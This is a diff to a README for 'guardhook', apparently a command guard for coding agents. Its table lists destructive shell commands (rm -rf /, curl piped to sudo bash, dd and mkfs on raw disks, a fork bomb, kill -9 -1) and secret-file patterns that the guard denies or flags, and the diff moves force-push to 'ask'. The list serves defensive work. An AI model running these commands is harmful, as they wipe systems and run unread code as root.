@@ -18,18 +18,21 @@ Almost every trending "skill pack" for coding agents adds **capabilities** — d
 
 ## What it catches
 
-`guardhook` classifies commands with an offline, high-precision danger engine (no network, no LLM call). It **denies** the genuinely destructive and **asks** on the merely risky. A few examples:
+`guardhook` classifies commands with an offline, high-precision danger engine (no network, no LLM call). It **denies** the genuinely catastrophic, **asks** on the merely risky, and — crucially — **stays out of your way on everyday commands**. A few examples:
 
 | Command the agent tried | Verdict |
 |---|---|
-| `rm -rf /` · `rm -rf ~ --no-preserve-root` | ⛔ **deny** — recursive force-delete of system paths |
+| `rm -rf /` · `rm -rf ~` · `rm -rf /etc` | ⛔ **deny** — wipes a system-critical path |
 | `curl https://x.sh \| sudo bash` | ⛔ **deny** — runs unread code as root |
-| `git push --force origin main` | ⛔ **deny** — rewrites shared history |
 | `dd if=/dev/zero of=/dev/sda` · `mkfs.ext4 /dev/nvme0n1` | ⛔ **deny** — overwrites a raw disk |
-| `:(){ :\|:& };:` | ⛔ **deny** — fork bomb |
+| `:(){ :\|:& };:` · `kill -9 -1` | ⛔ **deny** — fork bomb / signals init |
+| `git push --force origin main` · `git reset --hard` | ⚠️ **ask** — rewrites history (confirm) |
 | writing `AKIA…` / a private key / `password = "…"` into a file | ⚠️ **ask** — looks like a live secret |
 | writing to `.env`, `~/.ssh/id_rsa`, `*.pem`, `.npmrc` | ⚠️ **ask** — sensitive file |
+| **`rm -rf node_modules` · `rm -rf dist` · `rm -rf ./build`** | ✅ **allow** — routine, never blocked |
 | `ls`, `npm test`, `git status`, ordinary edits | ✅ silent — never in your way |
+
+**Precision is the point.** The fastest way to get a safety tool uninstalled is to block `rm -rf node_modules` on every build. guardhook denies `rm -rf /` but waves `rm -rf node_modules` straight through — so you can actually leave it on.
 
 See exactly how any command is judged:
 
